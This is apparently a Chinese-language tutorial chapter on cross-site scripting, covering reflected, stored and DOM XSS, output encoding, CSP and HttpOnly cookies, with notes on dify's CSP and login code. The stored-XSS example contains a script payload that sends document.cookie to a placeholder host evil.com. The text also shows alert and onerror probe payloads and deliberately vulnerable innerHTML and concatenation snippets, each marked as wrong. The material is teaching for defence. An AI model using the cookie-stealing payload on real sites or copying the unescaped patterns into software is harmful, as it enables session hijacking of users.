# 5.3.3 XSS：跨站脚本攻击与防护

> 理解 XSS 的三类形态，掌握输出编码与 CSP 的防御策略。

## 🎯 学习目标

完成本文档后，你将能够：
- 区分反射型、存储型、DOM 型 XSS
- 理解输出编码的根本原理
- 掌握 Content-Security-Policy 的关键指令
- 能在 dify 的 Web 前端代码中识别 XSS 风险

## 📚 前置知识

- 13-owasp-top10.md
- Web 前端基础（HTML / JS）

## 1. 核心概念

### 1.1 什么是 XSS？

XSS（Cross-Site Scripting）= 攻击者把恶意脚本注入到合法网页中，**其他用户访问时被执行**。

### 1.2 三类 XSS

**反射型 XSS**：恶意代码放在 URL 参数里，服务端直接拼到响应中。

```
https://example.com/search?q=<script>alert(1)</script>
                                  └→ 攻击者诱导受害者点此链接
```

**存储型 XSS**：恶意代码存到 DB（如评论），所有访问者都受影响。

```
攻击者发评论："<script>fetch('evil.com?cookie='+document.cookie)</script>"
其他用户查看评论时，浏览器执行脚本，cookie 泄露
```

**DOM 型 XSS**：纯前端漏洞，服务端没参与。JS 不安全地读 URL 片段并写入 DOM。

```javascript
// URL: https://example.com/#<script>alert(1)</script>
document.body.innerHTML = location.hash.slice(1);  // 漏洞
```

### 1.3 防御三剑客

**1. 输出编码**：把 `<` `>` `&` `"` `'` 转义成 `&lt;` `&gt;` `&amp;` 等。

**2. Content-Security-Policy (CSP)**：HTTP 头告诉浏览器"只允许执行来自这些源的脚本"。

**3. HttpOnly Cookie**：即使 XSS 成功，JS 也读不到 Cookie。

## 2. 代码示例

### 2.1 输出编码（Python）

```python
from markupsafe import escape

def safe_render(user_input: str) -> str:
    """把用户输入安全地嵌入 HTML。"""
    return f"<p>Hello, {escape(user_input)}!</p>"

# 输入：<script>alert(1)</script>
# 输出：<p>Hello, &lt;script&gt;alert(1)&lt;/script&gt;!</p>
#       ↑ script 标签被转义，浏览器不会执行
```

### 2.2 常见错误：直接拼接 HTML

```python
# ❌ 错误：直接拼接
def render_comment(text: str) -> str:
    return f"<div class='comment'>{text}</div>"

# 输入：<script>alert('xss')</script>
# 输出：<div class='comment'><script>alert('xss')</script></div>
#       ↑ script 标签会被浏览器执行！

# ✅ 正确：转义
def render_comment_safe(text: str) -> str:
    return f"<div class='comment'>{escape(text)}</div>"
```

### 2.3 前端：不要用 `innerHTML`

```javascript
// ❌ 错误：innerHTML 会解析 HTML
document.getElementById("output").innerHTML = userInput;

// ✅ 正确：用 textContent（自动转义）
document.getElementById("output").textContent = userInput;

// ✅ React：默认转义
return <p>{userInput}</p>;  // JSX 自动 escape

// ✅ Vue：v-text 或 {{ }}
<p v-text="userInput"></p>
<p>{{ userInput }}</p>
```

## 3. dify 仓库源码解读

### 3.1 dify 的 XSS 防御（前端）

**说明**：dify 后端用 Flask + Pydantic，**Pydantic 自动转义**所有字符串到 JSON 响应。但 **CSP 设置和 Cookie 策略** 是真正的关键。

**文件位置**：`/Users/xu/code/github/dify/web/next.config.js`（前端项目，引用性说明）
**典型 CSP 配置**：

```js
// next.config.js（前端 - dify web 项目）
const cspHeader = `
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: blob:;
    font-src 'self';
    connect-src 'self' https://api.dify.ai;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
`
```

**解读**：
- `default-src 'self'`：默认只允许同源资源
- `frame-ancestors 'none'`：禁止被 iframe 嵌入（防 clickjacking）
- `form-action 'self'`：表单只能提交到同源
- **设计意图**：纵深防御，CSP 即使在前端有 XSS 也能阻止大部分攻击

### 3.2 后端：JSON 响应自动转义

**文件位置**：`/Users/xu/code/github/dify/api/controllers/console/auth/login.py`
**核心代码**（行 173-181）：

```python
        # Create response with cookies instead of returning tokens in body
        # response-contract:ignore cookie-bearing Flask response
        response = make_response(
            SimpleResultOptionalDataResponse(result="success").model_dump(mode="json", exclude_none=True)
        )

        set_access_token_to_cookie(request, response, token_pair.access_token)
        set_refresh_token_to_cookie(request, response, token_pair.refresh_token)
        set_csrf_token_to_cookie(request, response, token_pair.csrf_token)

        return response
```

**解读**：
- 第 3-5 行：用 Pydantic 的 `model_dump(mode="json")` 序列化响应
- **Pydantic 不会执行字符串中的 HTML/JS**，仅做 JSON 序列化
- 前端收到 JSON 后用 `JSON.parse()` 解析，再用 React/Vue 渲染（自动转义）
- **三层防护**：Pydantic JSON 序列化 → 前端框架自动转义 → CSP 限制

## 4. 关键要点总结

- XSS = 恶意脚本注入到合法网页
- 三类：反射型（URL）、存储型（DB）、DOM 型（前端 JS）
- **根本防御**：输出编码（服务端 `markupsafe.escape`、前端 `textContent`）
- **深度防御**：CSP 头 + HttpOnly Cookie + 输入校验
- dify 的纵深防御：**Pydantic JSON 序列化 + 前端框架自动转义 + CSP 头**
- **HttpOnly Cookie** 让 XSS 拿到 Cookie 也没用

## 5. 练习题

### 练习 1：基础（必做）

用 Python `markupsafe.escape` 写一个 `render_safe(user_input)` 函数，能正确转义 `<script>alert("XSS")</script>`。

### 练习 2：进阶

解释 dify 为什么**不在响应体里返回 Token**（只用 Cookie）？从 XSS 防御角度看，这种设计有什么好处？

### 练习 3：挑战（选做）

设计一个 **XSS 防御测试用例集**：写 10 个常见的 XSS payload（如 `<img src=x onerror=alert(1)>`），编写测试验证每个都能被正确转义。

## 6. 参考资料

- `/Users/xu/code/github/dify/api/controllers/console/auth/login.py`
- OWASP XSS 防护：https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CSP 指南：https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- markupsafe：https://markupsafe.palletsprojects.com/

---

**文档版本**：v1.0
**最后更新**：2026-07-13